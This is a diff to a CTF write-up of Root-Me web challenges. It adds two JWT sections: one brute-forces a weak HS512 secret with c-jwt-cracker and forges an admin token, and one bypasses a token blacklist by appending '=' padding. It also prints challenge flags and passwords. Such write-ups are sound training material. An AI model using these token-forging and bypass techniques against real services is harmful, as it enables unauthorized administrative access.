@@ -270,7 +270,7 @@ This application include local file, first we try set page include root folder (
 
 We can see `86hwnX2r` folder in /. Next: `?galerie=86hwnX2r`
 
-Oh, we can see the `password.txt` in folder `86hwnX2r`. OK, pen file: `http://challenge01.root-me.org/web-serveur/ch15/galerie/86hwnX2r/password.txt` -> kcb$!Bx@v4Gs9Ez
+Oh, we can see the `password.txt` in folder `86hwnX2r`. OK, open file: `http://challenge01.root-me.org/web-serveur/ch15/galerie/86hwnX2r/password.txt` -> kcb$!Bx@v4Gs9Ez
 
 ### File upload - Null byte
 
@@ -288,5 +288,148 @@ After upload file, we can access file to get password: http://challenge01.root-m
 ```
 Well done ! You can validate this challenge with the password : YPNchi2NmTwygr2dgCCF
 This file is already deleted.
+```
+
+### JSON Web Token (JWT) - Weak secret
+
+Access to /token, we get the token:
+
+`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw`
+
+Try decode it:
+
+`echo -n eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9 | base64 -d` -> {"typ":"JWT","alg":"HS512"}
+
+`echo -n eyJyb2xlIjoiZ3Vlc3QifQ | base64 -d` -> {"role":"guest"}
+
+We need brute-force to find secret: 4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw
+
+In this challenge, I will use `https://github.com/brendan-rius/c-jwt-cracker` to brute-force secret:
+
+`./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw qwertyuiopasdfghjklzxvbnm1234567890 6 sha512`
+
+where `qwertyuiopasdfghjklzxvbnm1234567890` is valid character, `6` is maximum length of secret.
+
+```
+Secret is "lol"
+```
+
+Now we can generate jwt for admin with payload data is `{"role":"admin"}`: This is `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA`
+
+POST to /admin, we get:
+
+```
+"message": "method to authenticate is: 'Authorization: Bearer YOURTOKEN'"}
+```
+
+Change Header `Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA` and Re-POST:
+
+```
+"result": "Congrats!! Here is your flag: PleaseUseAStrongSecretNextTime\n"
+```
+
+### JWT - Revoked token
+
+This is source code:
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from flask import Flask, request, jsonify
+from flask_jwt_extended import JWTManager, jwt_required, create_access_token, decode_token
+import datetime
+from apscheduler.schedulers.background import BackgroundScheduler
+import threading
+import jwt
+from config import *
+ 
+# Setup flask
+app = Flask(__name__)
+ 
+app.config['JWT_SECRET_KEY'] = SECRET
+jwtmanager = JWTManager(app)
+blacklist = set()
+lock = threading.Lock()
+ 
+# Free memory from expired tokens, as they are no longer useful
+def delete_expired_tokens():
+    with lock:
+        to_remove = set()
+        global blacklist
+        for access_token in blacklist:
+            try:
+                jwt.decode(access_token, app.config['JWT_SECRET_KEY'],algorithm='HS256')
+            except:
+                to_remove.add(access_token)
+       
+        blacklist = blacklist.difference(to_remove)
+ 
+@app.route("/web-serveur/ch63/")
+def index():
+    return "POST : /web-serveur/ch63/login <br>\nGET : /web-serveur/ch63/admin"
+ 
+# Standard login endpoint
+@app.route('/web-serveur/ch63/login', methods=['POST'])
+def login():
+    try:
+        username = request.json.get('username', None)
+        password = request.json.get('password', None)
+    except:
+        return jsonify({"msg":"""Bad request. Submit your login / pass as {"username":"admin","password":"admin"}"""}), 400
+ 
+    if username != 'admin' or password != 'admin':
+        return jsonify({"msg": "Bad username or password"}), 401
+ 
+    access_token = create_access_token(identity=username,expires_delta=datetime.timedelta(minutes=3))
+    ret = {
+        'access_token': access_token,
+    }
+   
+    with lock:
+        blacklist.add(access_token)
+ 
+    return jsonify(ret), 200
+ 
+# Standard admin endpoint
+@app.route('/web-serveur/ch63/admin', methods=['GET'])
+@jwt_required
+def protected():
+    access_token = request.headers.get("Authorization").split()[1]
+    with lock:
+        if access_token in blacklist:
+            return jsonify({"msg":"Token is revoked"})
+        else:
+            return jsonify({'Congratzzzz!!!_flag:': FLAG})
+ 
+ 
+if __name__ == '__main__':
+    scheduler = BackgroundScheduler()
+    job = scheduler.add_job(delete_expired_tokens, 'interval', seconds=10)
+    scheduler.start()
+    app.run(debug=False, host='0.0.0.0', port=5000)
+```
+
+First, POST request to /login with parameter: `{"username": "admin", "password": "admin"}` with `Content-Type: application/json`, we get the jwt token:
+
+`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NDgyMjU4NjEsIm5iZiI6MTY0ODIyNTg2MSwianRpIjoiYjI3ZjYxZTctZmY4Mi00YTgwLWEzODktYjZlZTdhYjE0NThmIiwiZXhwIjoxNjQ4MjI2MDQxLCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.i7tCb7lTEfk88Rz6G0lBsG5k0hOKuHUF4uKSNqYVZ_0`
+
+Go to /admin, add header `Authentication: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NDgyMjU4NjEsIm5iZiI6MTY0ODIyNTg2MSwianRpIjoiYjI3ZjYxZTctZmY4Mi00YTgwLWEzODktYjZlZTdhYjE0NThmIiwiZXhwIjoxNjQ4MjI2MDQxLCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.i7tCb7lTEfk88Rz6G0lBsG5k0hOKuHUF4uKSNqYVZ_0`
+
+```
+{"msg":"Bad Authorization header. Expected value 'Bearer <JWT>'"}
+```
+
+Change header `Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NDgyMjU4NjEsIm5iZiI6MTY0ODIyNTg2MSwianRpIjoiYjI3ZjYxZTctZmY4Mi00YTgwLWEzODktYjZlZTdhYjE0NThmIiwiZXhwIjoxNjQ4MjI2MDQxLCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.i7tCb7lTEfk88Rz6G0lBsG5k0hOKuHUF4uKSNqYVZ_0`
+
+```
+{"msg":"Token is revoked"}
+```
+
+Because the token was saved in blacklist, but based base64 decode we have the `=` is padding. Let's change the header (by adding `=` in the last of token):
+
+`Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NDgyMjU4NjEsIm5iZiI6MTY0ODIyNTg2MSwianRpIjoiYjI3ZjYxZTctZmY4Mi00YTgwLWEzODktYjZlZTdhYjE0NThmIiwiZXhwIjoxNjQ4MjI2MDQxLCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.i7tCb7lTEfk88Rz6G0lBsG5k0hOKuHUF4uKSNqYVZ_0=`
+
+```
+{"Congratzzzz!!!_flag:":"Do_n0t_r3v0ke_3nc0d3dTokenz_Mam3ne-Us3_th3_JTI_f1eld"}
 ```
 
